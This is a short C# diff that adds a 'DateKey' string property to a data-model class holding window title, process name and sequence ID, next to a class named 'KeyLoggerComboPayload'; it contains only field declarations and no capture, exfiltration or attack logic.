@@ -40,6 +40,7 @@ namespace Common.Models
         public string WindowTitle { get; set; } = string.Empty;
         public string ProcessName { get; set; } = string.Empty;
         public int? SequenceId { get; set; }
+        public string DateKey { get; set; } = string.Empty;
     }
 
     public sealed class KeyLoggerComboPayload
